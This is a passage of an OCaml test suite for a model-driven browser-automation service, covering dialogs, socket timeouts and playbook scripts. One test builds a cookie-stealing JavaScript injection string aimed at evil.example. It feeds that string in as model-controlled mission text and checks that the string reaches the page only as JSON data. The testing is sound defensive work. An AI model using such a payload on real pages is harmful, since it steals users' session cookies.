                  Leash.Playbook.load ~caps "examples/playbooks/automationexercise.com"
                with
                | Ok book -> book
                | Error why -> Alcotest.fail why)
          in
          let read ~(caps : < Ox_caps.Cap.fs_read ; .. >) path =
            let channel = Ox_caps.Cap_stdlib.open_in_bin ~caps path in
            Fun.protect
              ~finally:(fun () -> close_in channel)
              (fun () -> really_input_string channel (in_channel_length channel))
          in
          let before = read ~caps playbook.Leash.Playbook.file in
          let h =
            result (request tabs "alice" (P.New { url = Some product_url; label = None }))
            |> tab
          in
          let questions = ref [] in
          (* fly-yolk: procedure BLOCKED enters the operator. A DONE nothing can verify
             still asks the planner once; run-rq6i: it answers with a procedure, which the
             loop runs and verifies, and the next DONE accepts that verification. *)
          let candidate : Leash.Playbook.procedure =
            Leash.Playbook.
              {
                slug = "check-modal";
                description = "Check the added-to-cart modal.";
                args = None;
                steps = [ Goal { goal = "Look at the page."; hint = None } ];
                expect = [ "the page is post-add" ];
                repeat = None;
              }
          in
          let playbook =
            {
              playbook with
              Leash.Playbook.playbook =
                {
                  playbook.playbook with
                  procedures = candidate :: playbook.playbook.procedures;
                };
            }
          in
          let levels = levels_with [ "check-modal"; "DONE" ] questions in
          let reply =
            with_ticking_clock env sw (fun () ->
                Leash.Control.handle ~model:"fixture-model" ~levels
                  ~installed:[ playbook ] ~decide:decide_done tabs
                  (run_wire ~tab:h "check the cart"))
            |> Yojson.Safe.from_string |> P.decode_reply
          in
          let body = decoded reply in
          Alcotest.(check string)
            "run-rq6i the planned procedure ends the mission" "done"
            (match get "status" body with `String s -> s | _ -> "");
          (match get "procedures" body with
          | `List [ entry ] ->
              Alcotest.(check string)
                "pilot-x1f3 the trace names the selected candidate" "check-modal"
                (match get "slug" entry with `String s -> s | _ -> "");
              Alcotest.(check bool)
                "run-m0r8 it is marked planned" true
                (match get "planned" entry with `Bool b -> b | _ -> false)
          | _ -> Alcotest.fail "run-rq6i the trace is not the one planned procedure");
          Alcotest.(check string)
            "run-m0r8 the installed playbook is untouched" before
            (read ~caps playbook.Leash.Playbook.file);
          match get "planner_turns" body with
          | `List [ first; last ] ->
              Alcotest.(check bool)
                "pilot owns first and last turns" true
                (get "answer" first = str "leg" && get "answer" last = str "done")
          | _ -> Alcotest.fail "run-w7ke no planner turn"))

(* L33 run-3vat run-xda7: command enters production Tabs.run through Control,
   writes a whole proposed playbook and leaves the installed directory untouched. *)
let dialog_interruptions
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  rig ~caps (fun _ sw _ tabs fake ->
      let fake = fake () in
      Fake.on_method fake "Page.handleJavaScriptDialog" (fun _ ->
          Fake.emit ~session:"session-1" fake ~method_:"Page.javascriptDialogClosed"
            ~params:(obj [ ("result", `Bool true); ("userInput", str "") ]);
          obj []);
      let emit kind ?default_prompt () =
        Fake.emit ~session:"session-1" fake ~method_:"Page.javascriptDialogOpening"
          ~params:
            (obj
               ([
                  ("url", str "https://example.com/");
                  ("message", str "Question");
                  ("type", str kind);
                  ("hasBrowserHandler", `Bool true);
                ]
               @
               match default_prompt with
               | None -> []
               | Some text -> [ ("defaultPrompt", str text) ]))
      in
      Fake.on_method fake "Page.navigate" (fun _ ->
          emit "prompt" ~default_prompt:"Suggested" ();
          obj [ ("frameId", str "frame-1") ]);
      let info =
        settle ~sw "hard-6eei new prompt" (fun () ->
            request tabs "alice"
              (P.New { url = Some "https://example.com/"; label = None }))
        |> result
      in
      let handle = tab info in
      Alcotest.(check string)
        "hard-92ik default prompt" "Suggested"
        (match get "default_prompt" (get "dialog" info) with
        | `String text -> text
        | _ -> "missing");
      Alcotest.(check string)
        "hard-6eei title can be empty" ""
        (match get "title" info with `String text -> text | _ -> "missing");
      check_code "hard-s719 wait blocked" "dialog-open"
        (request tabs "alice"
           (P.Wait
              {
                tab = handle;
                until =
                  {
                    url_prefix = None;
                    text = Some "never";
                    index_gone = None;
                    dialog = None;
                    changed_since = None;
                  };
                timeout_ms = Some 5000;
              }));
      ignore
        (result
           (request tabs "alice"
              (P.Dialog
                 {
                   tab = handle;
                   answer =
                     (match P.Answer.of_string "dismiss" with
                     | Ok x -> x
                     | Error _ -> assert false);
                   text = None;
                 })));
      Fake.on_method fake "Page.navigate" (fun _ ->
          emit "alert" ();
          obj [ ("frameId", str "frame-1") ]);
      let nav =
        settle ~sw "hard-6eei nav alert" (fun () ->
            request tabs "alice"
              (P.Nav { tab = handle; url = "https://example.com/next" }))
        |> result
      in
      Alcotest.(check bool) "hard-6eei same tab handle" true (tab nav = handle);
      Alcotest.(check string)
        "hard-tsva nav dialog" "alert"
        (match get "kind" (get "dialog" nav) with `String text -> text | _ -> "missing");
      ignore
        (result
           (request tabs "alice"
              (P.Dialog
                 {
                   tab = handle;
                   answer =
                     (match P.Answer.of_string "dismiss" with
                     | Ok x -> x
                     | Error _ -> assert false);
                   text = None;
                 })));
      Fake.on_method fake "Target.closeTarget" (fun _ ->
          emit "beforeunload" ();
          obj [ ("success", `Bool true) ]);
      ignore (result (request tabs "alice" (P.Close { tab = handle })));
      Alcotest.(check bool)
        "hard-t6cq beforeunload accepted" true
        (Fake.received fake
        |> List.exists (fun call ->
            field "method" call = Some (str "Page.handleJavaScriptDialog")
            && Option.bind (field "params" call) (field "accept") = Some (`Bool true))))

(* hard-yi0a: a real Unix listener writes a timeout envelope after cancelling a
   blocked handler, rather than silently closing the connection. *)
let listener_budget_reply
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.network
       ; Ox_caps.Cap.random
       ; Ox_caps.Cap.tmp
       ; .. >) () =
  with_runtime ~caps (fun runtime ->
      rig ~caps (fun env sw _ tabs fake ->
          let tab =
            result (request tabs "alice" (P.New { url = None; label = None })) |> tab
          in
          Fake.withhold (fake ()) "Target.closeTarget" (fun _ -> true);
          let path = Filename.concat (Filename.concat runtime "leash") "control.sock" in
          let _control =
            match
              Leash.Control.create ~sw ~path
                {
                  Leash.Control.tabs;
                  status_query = (fun () -> []);
                  models_status =
                    (fun () ->
                      P.
                        {
                          configured = false;
                          jev_model = "unconfigured";
                          text_model = "";
                          systemone_endpoint = "";
                          chat_base_url = "";
                        });
                  fs = env#fs;
                  net = env#net;
                  clock = env#clock;
                  logger =
                    Ox_observability.Logger.create ~service:"socket-test" ~clock:env#clock
                      ~mono_clock:env#mono_clock
                      ~reporter:(Ox_observability.Logger.Reporter.writer ignore)
                      ();
                  caps :> Leash.Control.caps;
                }
            with
            | Ok control -> control
            | Error _ -> Alcotest.fail "hard-yi0a listener refused"
          in
          let flow = Eio.Net.connect ~sw env#net (`Unix path) in
          let wire =
            P.encode_request { command = P.Close { tab } } |> Yojson.Safe.to_string
          in
          Eio.Flow.copy_string (wire ^ "\n") flow;
          Eio.Fiber.fork ~sw (fun () ->
              let rec wait n =
                if n = 0 then Alcotest.fail "hard-yi0a handler never reached Chrome"
                else if
                  Fake.received (fake ())
                  |> List.exists (fun call ->
                      field "method" call = Some (str "Target.closeTarget"))
                then (
                  Ox_test.advance env#clock (Ox.Duration.seconds 2);
                  Ox_test.advance env#clock (Ox.Duration.seconds 2))
                else (
                  Eio.Fiber.yield ();
                  wait (n - 1))
              in
              wait 1000);
          let reply =
            Eio.Buf_read.line (Eio.Buf_read.of_flow flow ~max_size:4096)
            |> Yojson.Safe.from_string
          in
          Alcotest.(check bool)
            "hard-yi0a timeout envelope" false
            (get "ok" reply = `Bool true);
          let failure = get "error" reply in
          Alcotest.(check string)
            "hard-yi0a timeout code" "timeout"
            (match get "code" failure with `String s -> s | _ -> "missing");
          let detail = get "detail" failure in
          Alcotest.(check string)
            "hard-yi0a command" "close"
            (match get "command" detail with `String s -> s | _ -> "missing");
          Alcotest.(check int)
            "hard-yi0a full budget in milliseconds" 1000
            (match get "budget_ms" detail with `Int n -> n | _ -> -1);
          Fake.on_method (fake ()) "Target.closeTarget" (fun _ ->
              obj [ ("success", `Bool true) ])))

(* ---------- L37: playbook scripts at the control seam ---------- *)

let rec rm_rf ~(caps : < Ox_caps.Cap.fs_read ; Ox_caps.Cap.fs_write ; .. >) path =
  match (Unix.lstat path).Unix.st_kind with
  | Unix.S_DIR ->
      Array.iter
        (fun entry -> rm_rf ~caps (Filename.concat path entry))
        (Ox_caps.Cap_sys.readdir ~caps path);
      Ox_caps.Cap_unix.rmdir ~caps path
  | _ -> Ox_caps.Cap_sys.remove ~caps path
  | exception Unix.Unix_error _ -> ()

let write_tree ~(caps : < Ox_caps.Cap.fs_write ; .. >) root files =
  List.iter
    (fun (path, content) ->
      let file = Filename.concat root path in
      let rec parents ~(caps : < Ox_caps.Cap.fs_write ; .. >) p =
        if not (Sys.file_exists p) then (
          parents ~caps (Filename.dirname p);
          Ox_caps.Cap_unix.mkdir ~caps p 0o700)
      in
      parents ~caps (Filename.dirname file);
      let channel = Ox_caps.Cap_stdlib.open_out_bin ~caps file in
      output_string channel content;
      close_out channel)
    files

let list_js =
  "const rows = await (await fetch('/api/books.json')).json();\n\
   return rows.map(r => ({title: r.title, price: r.price}));"

let books_json =
  {|{
 "site":"automationexercise.com","entry":"https://automationexercise.com/","description":"Books to collect",
 "pages":[{"name":"page","url_pattern":"https://automationexercise.com/*"}],
 "shapes":{"row":[{"title":"string","price":"number"}],"title":[{"title":"string"}]},
 "scripts":{
   "list":{"file":"scripts/list.js","description":"List the books.","returns":"row"},
   "tiny":{"source":"return [{title: 'a long title that is over ten bytes'}]","description":"A tiny list.","returns":"title"},
   "broken":{"source":"return [SYNTAX_BAD","description":"Broken on purpose.","returns":"title"}
 },
 "procedures":[{"slug":"collect","description":"Collect the list.","args":{"q":{"from":"mission"}},
   "steps":[{"script":"list","args":{"q":"{q}"}}],"expect":["the page shows Added!"]},
  {"slug":"open","description":"Open the list.","steps":[{"goal":"Open the list."},{"use":"collect"}],"expect":["the page shows Added!"]}]
}|}

(* The playbook directory is made and loaded the way an operator's is, under a directory
   called [books]. *)
let with_books
    ~(caps : < Ox_caps.Cap.fs_read ; Ox_caps.Cap.fs_write ; Ox_caps.Cap.tmp ; .. >) f =
  let root = Ox_caps.Cap_stdlib.Filename.temp_file ~caps "leash-books" "" in
  Ox_caps.Cap_sys.remove ~caps root;
  Ox_caps.Cap_unix.mkdir ~caps root 0o700;
  Fun.protect
    ~finally:(fun () -> rm_rf ~caps root)
    (fun () ->
      write_tree ~caps root
        [ ("books/playbook.json", books_json); ("books/scripts/list.js", list_js) ];
      match Leash.Playbook.load ~caps (Filename.concat root "books") with
      | Ok book -> f book
      | Error why -> Alcotest.fail why)

let handle_with ?levels ?text_helper ?(decide = decide_done) ~installed tabs who command =
  let levels = Some (Option.value levels ~default:(levels_with [] (ref []))) in
  let wire = P.encode_request { command } |> Yojson.Safe.to_string in
  match
    P.decode_reply
      (Yojson.Safe.from_string
         (Leash.Control.handle ~model:"fixture-model" ?levels ?text_helper ~installed
            ~decide tabs wire))
  with
  | Ok reply -> reply
  | Error why -> Alcotest.fail why

let value_reply value =
  obj [ ("result", obj [ ("type", str "object"); ("value", value) ]) ]

let threw description =
  obj
    [
      ("result", obj [ ("type", str "object") ]);
      ( "exceptionDetails",
        obj
          [
            ("text", str "Uncaught");
            ("exception", obj [ ("description", str description) ]);
          ] );
    ]

(* A page whose script calls are answered by [reply]; everything else is [page_script]'s. *)
let script_page fake ~reply =
  page_script fake (fixture "unlabelled-controls-chrome.json") modal_text;
  document_at ~title:"Books" ~url:product_url fake;
  let scroll_metrics =
    value_reply (obj [ ("y", `Int 0); ("viewport", `Int 400); ("height", `Int 1000) ])
  in
  Fake.on_method fake "Runtime.callFunctionOn" (fun request ->
      let params = get "params" request in
      match get "functionDeclaration" params with
      | `String declaration
        when String.starts_with ~prefix:"async function(args)" declaration ->
          reply declaration params
      | _ -> scroll_metrics)

let payloads fake =
  (* every text the service handed the page's JavaScript engine, in order *)
  Fake.received fake
  |> List.filter_map (fun json ->
      match (field "method" json, field "params" json) with
      | Some (`String "Runtime.evaluate"), Some params -> (
          match field "expression" params with Some (`String e) -> Some e | _ -> None)
      | Some (`String "Runtime.callFunctionOn"), Some params -> (
          match field "functionDeclaration" params with
          | Some (`String d) -> Some d
          | _ -> None)
      | _ -> None)

let script_calls fake =
  Fake.received fake
  |> List.filter_map (fun json ->
      match (field "method" json, field "params" json) with
      | Some (`String "Runtime.callFunctionOn"), Some params -> (
          match field "functionDeclaration" params with
          | Some (`String d) when String.starts_with ~prefix:"async function(args)" d ->
              Some params
          | _ -> None)
      | _ -> None)

let wrapped code = "async function(args) {\n" ^ code ^ "\n}"

let books_rows =
  `List
    [
      `Assoc [ ("title", `String "A Light in the Attic"); ("price", `Float 51.77) ];
      `Assoc [ ("title", `String "Tipping the Velvet"); ("price", `Int 53) ];
    ]

let playbook_test_command
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; Ox_caps.Cap.tmp
       ; .. >) () =
  with_books ~caps (fun book ->
      rig ~caps (fun _ _ _ tabs fake ->
          let f = fake () in
          let answer = ref (value_reply books_rows) in
          script_page f ~reply:(fun _ _ -> !answer);
          let h =
            result (request tabs "alice" (P.New { url = Some product_url; label = None }))
            |> tab
          in
          let test ?(who = "alice") ?args script =
            handle_with ~installed:[ book ] tabs who
              (P.Playbook_test { tab = h; script; args })
          in
          (* extr-mp5z extr-8o1h extr-vgir: the script runs in the page through
             callFunctionOn with awaitPromise, as the body of an async function of args. *)
          let body = result (test ~args:(obj [ ("q", str "gpu") ]) "books/list") in
          Alcotest.(check bool)
            "extr-mp5z the validated output is printed" true
            (get "value" body = books_rows);
          Alcotest.(check bool)
            "extr-mp5z the record count" true
            (get "records" body = `Int 2);
          (match script_calls f with
          | [ call ] ->
              Alcotest.(check bool)
                "extr-vgir the file's text, fetch and all, is the function body" true
                (get "functionDeclaration" call = str (wrapped list_js));
              Alcotest.(check bool)
                "extr-8o1h awaitPromise, so a script may await a fetch" true
                (get "awaitPromise" call = `Bool true);
              Alcotest.(check bool)
                "extr-8o1h the result comes by value" true
                (get "returnByValue" call = `Bool true);
              Alcotest.(check bool)
                "extr-8o1h the arguments are JSON" true
                (get "arguments" call
                = `List [ obj [ ("value", obj [ ("q", str "gpu") ]) ] ])
          | calls -> Alcotest.failf "extr-mp5z %d script calls" (List.length calls));
          (* extr-8o1h: the result must fit its shape, and the error names the path. *)
          answer :=
            value_reply
              (`List [ `Assoc [ ("title", `String "x"); ("price", `String "9") ] ]);
          (match test "books/list" with
          | P.Failure error ->
              Alcotest.(check string)
                "extr-8o1h invalid output" "script-invalid"
                (P.Error_code.to_string error.P.code);
              Alcotest.(check string)
                "extr-8o1h the path of the first mismatch"
                "$[0].price: expected number, got string" error.P.message
          | P.Success _ -> Alcotest.fail "extr-8o1h invalid output was accepted");
          (* extr-8o1h: a script that throws is script-failed with what it threw. *)
          answer := threw "TypeError: rows is not iterable\n    at <anonymous>:2:9";
          (match test "books/list" with
          | P.Failure error ->
              Alcotest.(check string)
                "extr-8o1h a throw" "script-failed"
                (P.Error_code.to_string error.P.code);
              Alcotest.(check bool)
                "extr-mp5z the exception is shown to the author" true
                (contains error.P.message "rows is not iterable")
          | P.Success _ -> Alcotest.fail "extr-8o1h a throw was accepted");
          (* extr-8o1h: a result over the script's bound is never returned as data. *)
          answer :=
            value_reply
              (`List
                 [ `Assoc [ ("title", `String "a long title that is over ten bytes") ] ]);
          (* map-fmt01: the bound is one global 8 MiB, not a per-script 10-byte cap. *)
          (match test "books/tiny" with
          | P.Success _ -> ()
          | P.Failure error ->
              Alcotest.failf "map-fmt01 a small result fits the global bound: %s"
                error.P.message);
          (* names: nothing else is looked up, nothing is sent for what is not a script *)
          let before = List.length (payloads f) in
          check_code "extr-mp5z no such script" "invalid-request" (test "books/absent");
          check_code "extr-mp5z no such playbook" "invalid-request" (test "shelf/list");
          check_code "extr-mp5z the reference is playbook/script" "invalid-request"
            (test "books");
          check_code "extr-k40c a path is not a playbook name" "invalid-request"
            (test "../books/list");
          check_code "extr-mp5z args are strings" "invalid-request"
            (test ~args:(obj [ ("q", `Int 1) ]) "books/list");
          let bad =
            match P.Handle.of_string "t_not_a_tab" with
            | Ok h -> h
            | Error e -> Alcotest.fail e
          in
          check_code "hand-0y04 playbook test needs the handle" "unknown-tab"
            (handle_with ~installed:[ book ] tabs "second"
               (P.Playbook_test { tab = bad; script = "books/list"; args = None }));
          Alcotest.(check int)
            "extr-k40c a refusal reaches the page with nothing" before
            (List.length (payloads f))))

let playbook_check_command
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; Ox_caps.Cap.tmp
       ; .. >) () =
  with_books ~caps (fun book ->
      rig ~caps (fun _ _ _ tabs fake ->
          let f = fake () in
          Fake.on_method f "Runtime.evaluate" (fun request ->
              match get "expression" (get "params" request) with
              | `String "globalThis" ->
                  obj [ ("result", obj [ ("objectId", str "global-object") ]) ]
              | `String e when contains e "getPrototypeOf(async function" ->
                  value_reply
                    (if contains e "SYNTAX_BAD" then
                       str "SyntaxError: missing ] after element list"
                     else `Null)
              | _ -> obj [ ("result", obj [ ("type", str "undefined") ]) ]);
          let body =
            result
              (handle_with ~installed:[ book ] tabs "alice"
                 (P.Playbook_check { playbook = "books" }))
          in
          let verdicts =
            match get "scripts" body with
            | `List xs -> xs
            | _ -> Alcotest.fail "no scripts"
          in
          let verdict name =
            match List.find_opt (fun v -> get "script" v = str name) verdicts with
            | Some v -> v
            | None -> Alcotest.failf "extr-lslp no verdict for %s" name
          in
          Alcotest.(check bool)
            "extr-lslp a good script compiles" true
            (get "ok" (verdict "list") = `Bool true);
          Alcotest.(check bool)
            "extr-lslp a syntax error is reported" true
            (get "ok" (verdict "broken") = `Bool false
            && contains
                 (match get "error" (verdict "broken") with `String e -> e | _ -> "")
                 "missing ]");
          (* Compiled, never called: no callFunctionOn, the text only inside new Function. *)
          Alcotest.(check int)
            "extr-lslp nothing was called" 0
            (List.length (script_calls f));
          let compiled =
            payloads f
            |> List.filter (fun e -> contains e "getPrototypeOf(async function")
          in
          Alcotest.(check int) "extr-lslp one compile per script" 3 (List.length compiled);
          Alcotest.(check bool)
            "extr-lslp the file's text is in a compile" true
            (List.exists
               (fun e -> contains e (Yojson.Safe.to_string (str list_js)))
               compiled);
          (* The blank page is the caller's for the duration and gone after. *)
          let created =
            Fake.received f
            |> List.filter (fun j -> field "method" j = Some (str "Target.createTarget"))
          in
          Alcotest.(check bool)
            "extr-lslp a blank tab was used" true
            (List.for_all
               (fun j -> get "url" (get "params" j) = str "about:blank")
               created
            && created <> []);
          Alcotest.(check bool)
            "extr-lslp and closed" true
            (List.exists
               (fun j -> field "method" j = Some (str "Target.closeTarget"))
               (Fake.received f));
          Alcotest.(check bool)
            "extr-lslp no tab is left" true
            (get "open" (get "tabs" (result (request tabs "alice" P.Status))) = `Int 0);
          check_code "extr-lslp no such playbook" "invalid-request"
            (handle_with ~installed:[ book ] tabs "alice"
               (P.Playbook_check { playbook = "shelf" }))))

(* extr-8o1h extr-k40c: a mission whose every model-controlled string is hostile — the
   mission text, the argument the text helper fills — runs a script step. The page's engine
   is handed the playbook's script text exactly, with the hostile value only inside the
   JSON arguments; every other text it is handed is one the service itself owns. *)
let run_scripts
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; Ox_caps.Cap.tmp
       ; .. >) ?out hostile =
  with_books ~caps (fun book ->
      rig ~caps (fun env sw _ tabs fake ->
          let f = fake () in
          script_page f ~reply:(fun _ _ -> value_reply books_rows);
          let h =
            result (request tabs "alice" (P.New { url = Some product_url; label = None }))
            |> tab
          in
          let questions = ref [] in
          let base = levels_with [ "collect"; "DONE" ] (ref []) in
          let levels =
            Run.
              {
                base with
                plan =
                  (fun ~deadline request ->
                    questions := request :: !questions;
                    Leash__Model_usage.start "planner";
                    let answer = base.plan ~deadline request in
                    Leash__Model_usage.report "planner" (Some 0.2);
                    answer);
              }
          in
          let text_helper () =
            {
              Leash.Text_helper.complete =
                (fun ?deadline:_ _ ->
                  Leash__Model_usage.start "text_helper";
                  Leash__Model_usage.report "text_helper" None;
                  Ok (Some hostile));
            }
          in
          let decide ~deadline request =
            Leash__Model_usage.start "operator";
            let answer = decide_done ~deadline request in
            Leash__Model_usage.report "operator" (Some 0.4);
            answer
          in
          let reply =
            with_ticking_clock env sw (fun () ->
                handle_with ~levels ~text_helper ~decide ~installed:[ book ] tabs "alice"
                  (P.Drive
                     {
                       tab = Some h;
                       mission = "collect the books " ^ hostile;
                       max_steps = None;
                       start_url = None;
                       max_procedures = None;
                       deadline_s = None;
                       dry_run = None;
                       expect = None;
                       out;
                       secrets = [];
                     }))
          in
          (result reply, payloads f, script_calls f, !questions)))

let run_script_step
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; Ox_caps.Cap.tmp
       ; .. >) () =
  let hostile = "'); fetch('https://evil.example/steal?c='+document.cookie); ('" in
  let body, payloads_seen, calls, model_requests = run_scripts ~caps hostile in
  let billed = get "model_calls_by_kind" (get "data" body) in
  Alcotest.(check int)
    "pilot-ukoh counts pilot and argument helper requests" 3
    (match get "model_calls" body with `Int n -> n | _ -> -1);
  List.iter
    (fun (kind, expected) ->
      Alcotest.(check bool)
        ("extr-5x9e " ^ kind ^ " call count")
        true
        (get kind billed = `Int expected))
    [ ("planner", 2); ("text_helper", 1) ];
  Alcotest.(check bool)
    "fly-gn5z an unpriced helper makes model_cost unknown" true
    (get "model_cost" body = `Null);
  Alcotest.(check bool)
    "fly-gn5z reported_cost is the known subtotal" true
    (match get "reported_cost" (get "data" body) with
    | `Float cost -> Float.abs (cost -. 0.4) < 0.00001
    | _ -> false);
  Alcotest.(check bool)
    "extr-5x9e missing helper cost shown" true
    (get "cost_unreported" (get "data" body) = `Int 1);
  Alcotest.(check bool)
    "fly-mqkr output_kinds names the script records" true
    (match get "output_kinds" body with
    | `List kinds -> List.mem (str "script-record") kinds
    | _ -> false);
  List.iter
    (fun (question : Run.plan_request) ->
      let text = Yojson.Safe.to_string (Leash.Planner.pilot_request_json question) in
      Alcotest.(check bool)
        "extr-b3u0 records never enter recorded model payloads" false
        (contains text "A Light in the Attic" || contains text "Tipping the Velvet"))
    model_requests;
  let path = Ox_caps.Cap_stdlib.Filename.temp_file ~caps "leash-extr-b3u0" ".jsonl" in
  Fun.protect
    ~finally:(fun () -> Ox_caps.Cap_sys.remove ~caps path)
    (fun () ->
      let streamed, _, _, requests = run_scripts ~caps ~out:path "gpu" in
      let input = Ox_caps.Cap_stdlib.open_in_bin ~caps path in
      let rows =
        Fun.protect
          ~finally:(fun () -> close_in input)
          (fun () ->
            let rec lines acc =
              match input_line input with
              | line -> lines (Yojson.Safe.from_string line :: acc)
              | exception End_of_file -> List.rev acc
            in
            lines [])
      in
      let tagged kind =
        List.filter_map
          (fun line ->
            match line with
            | `Assoc fields when List.assoc_opt "kind" fields = Some (str kind) ->
                Some fields
            | _ -> None)
          rows
      in
      let records =
        List.filter_map
          (fun fields -> List.assoc_opt "record" fields)
          (tagged "script-record")
      in
      Alcotest.(check bool)
        "fly-mqkr streamed lines are tagged" true
        (List.length rows
        = List.length (tagged "script-record") + List.length (tagged "operator-state"));
      Alcotest.(check bool)
        "fly-mqkr script-record lines carry the validated records" true
        (records = match books_rows with `List rows -> rows | _ -> assert false);
      List.iter
        (fun fields ->
          Alcotest.(check bool)
            "fly-mqkr script records name the playbook lane" true
            (List.assoc_opt "source" fields = Some (str "playbook")
            && List.assoc_opt "script" fields = Some (str "list")
            &&
            match List.assoc_opt "playbook" fields with
            | Some (`String id) -> String.starts_with ~prefix:"book:" id
            | _ -> false))
        (tagged "script-record");
      Alcotest.(check bool)
        "extr-b3u0 bounded reply count" true
        (get "count" (get "data" streamed) = `Int 2);
      List.iter
        (fun (q : Run.plan_request) ->
          Alcotest.(check bool)
            "extr-b3u0 JSONL records absent from every model request" false
            (contains
               (Yojson.Safe.to_string (Leash.Planner.pilot_request_json q))
               "A Light in the Attic"))
        requests);
  Alcotest.(check bool) "extr-8o1h the run is done" true (get "status" body = str "done");
  Alcotest.(check bool)
    "extr-8o1h the runner counts the records; no model sees them" true
    (get "collected" body = `Int 2);
  (match get "procedures" body with
  | `List [ entry ] -> (
      match get "scripts" entry with
      | `List [ call ] ->
          Alcotest.(check bool)
            "extr-p152 the trace names the script" true
            (get "script" call = str "list");
          Alcotest.(check bool)
            "extr-p152 the page it ran on" true
            (get "url" call = str product_url);
          Alcotest.(check bool) "extr-p152 its records" true (get "records" call = `Int 2)
      | _ -> Alcotest.fail "extr-p152 the procedure traces no script")
  | _ -> Alcotest.fail "extr-8o1h the trace is not one procedure");
  (* extr-k40c: the script text is the loaded file's, the hostile value is data. *)
  (match calls with
  | [ call ] ->
      Alcotest.(check bool)
        "extr-k40c the function is the playbook's text, unchanged" true
        (get "functionDeclaration" call = str (wrapped list_js));
      Alcotest.(check bool)
        "extr-k40c the model-filled value travels as a JSON argument" true
        (get "arguments" call = `List [ obj [ ("value", obj [ ("q", str hostile) ]) ] ])
  | _ -> Alcotest.failf "extr-k40c %d script calls" (List.length calls));
  List.iter
    (fun text ->
      Alcotest.(check bool)
        "extr-k40c no model text in anything the engine is handed" false
        (contains text "evil.example" || contains text "document.cookie"))
    payloads_seen;
  (* Everything else the engine was handed is what a run with a harmless mission hands it. *)
  let _, baseline, _, _ = run_scripts ~caps "gpu" in
  let own text = not (String.starts_with ~prefix:"async function(args)" text) in
  let baseline = List.filter own baseline in
  List.iter
    (fun text ->
      if own text then
        Alcotest.(check bool)
          "extr-k40c only the service's own fixed texts and the playbook's scripts reach \
           the engine"
          true (List.mem text baseline))
    payloads_seen;
  Alcotest.(check bool)
    "extr-k40c and the hostile run handed the engine the same own texts" true
    (List.sort_uniq compare (List.filter own payloads_seen)
    = List.sort_uniq compare baseline)

(* L49 hand-mb9s hand-0wo8: share a capability across real socket clients. *)
let shared_handle_over_socket
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.network
       ; Ox_caps.Cap.random
       ; Ox_caps.Cap.tmp
       ; .. >) () =
  with_runtime ~caps (fun runtime ->
      rig ~caps (fun env sw _ tabs fake ->
          let fake = fake () in
          Fake.on_method fake "Runtime.evaluate" (fun _ ->
              obj [ ("result", obj [ ("value", str "shared page") ]) ]);
          let path = Filename.concat (Filename.concat runtime "leash") "control.sock" in
          let _control =
            match
              Leash.Control.create ~sw ~path
                {
                  Leash.Control.tabs;
                  status_query = (fun () -> []);
                  models_status =
                    (fun () ->
                      P.
                        {
                          configured = false;
                          jev_model = "unconfigured";
                          text_model = "";
                          systemone_endpoint = "";
                          chat_base_url = "";
                        });
                  fs = env#fs;
                  net = env#net;
                  clock = env#clock;
                  logger =
                    Ox_observability.Logger.create ~service:"handle-socket-test"
                      ~clock:env#clock ~mono_clock:env#mono_clock
                      ~reporter:(Ox_observability.Logger.Reporter.writer ignore)
                      ();
                  caps :> Leash.Control.caps;
                }
            with
            | Ok control -> control
            | Error _ -> Alcotest.fail "hand-mb9s listener refused"
          in
          let call command =
            let flow = Eio.Net.connect ~sw env#net (`Unix path) in
            let line = P.encode_request { command } |> Yojson.Safe.to_string in
            Eio.Flow.copy_string (line ^ "\n") flow;
            let json =
              Eio.Buf_read.line (Eio.Buf_read.of_flow flow ~max_size:1_048_576)
              |> Yojson.Safe.from_string
            in
            match P.decode_reply json with
            | Ok reply -> reply
            | Error e -> Alcotest.fail e
          in
          let h = result (call (P.New { url = None; label = Some "shared" })) |> tab in
          let text = P.Text { tab = h; index = None; max_chars = None } in
          Alcotest.(check bool)
            "hand-mb9s a new connection uses the handle" true
            (get "text" (result (call text)) = str "shared page");
          let first = ref None and second = ref None in
          let evaluations () =
            Fake.received fake
            |> List.filter (fun j -> field "method" j = Some (str "Runtime.evaluate"))
            |> List.length
          in
          let before = evaluations () in
          let hold = ref true in
          Fake.withhold fake "Runtime.evaluate" (fun _ ->
              if !hold then (
                hold := false;
                true)
              else false);
          let await label ready =
            let rec loop n =
              if ready () then ()
              else if n = 0 then Alcotest.fail label
              else (
                Eio.Fiber.yield ();
                loop (n - 1))
            in
            loop 1000
          in
          Eio.Fiber.fork ~sw (fun () -> first := Some (call text));
          await "first client did not enter Chrome" (fun () -> evaluations () > before);
          Eio.Fiber.fork ~sw (fun () -> second := Some (call text));
          for _ = 1 to 100 do
            Eio.Fiber.yield ()
          done;
          Alcotest.(check int)
            "hand-0wo8 second client stays behind the tab lock" (before + 1)
            (evaluations ());
          Alcotest.(check bool) "hand-0wo8 no early reply" true (!second = None);
          Ox_test.advance env#clock (Ox.Duration.seconds 40);
          await "socket clients did not settle" (fun () ->
              !first <> None && !second <> None);
          check_code "hand-0wo8 first client timeout" "timeout" (Option.get !first);
